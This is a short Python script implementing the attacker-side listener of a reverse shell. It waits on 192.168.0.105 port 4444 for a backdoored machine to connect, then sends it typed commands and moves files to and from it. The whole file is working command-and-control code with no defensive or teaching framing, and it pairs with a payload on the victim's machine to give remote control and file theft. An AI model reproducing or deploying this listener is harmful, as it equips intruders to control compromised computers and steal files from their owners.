import socket
import json
import base64

class Listner:
    def __init__(self, ip, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))

        server.listen(5)
        print("[+] Waiting the incomming connection...")
        self.connection, address = server.accept()
        print(f"\r[+] Got a connection from > {str(address)}")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_recive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotly(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            print("[-] Closing connection.")
            exit()
        return self.reliable_recive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def run(self):
        while True:
            command = input("sam@sepiol > ").split()
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotly(command)

                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
                    
                
            except Exception as e:
                result = f"[-] Error during Command execution: {e}"
            print(result)


my_listener = Listner("192.168.0.105", 4444)
my_listener.run()

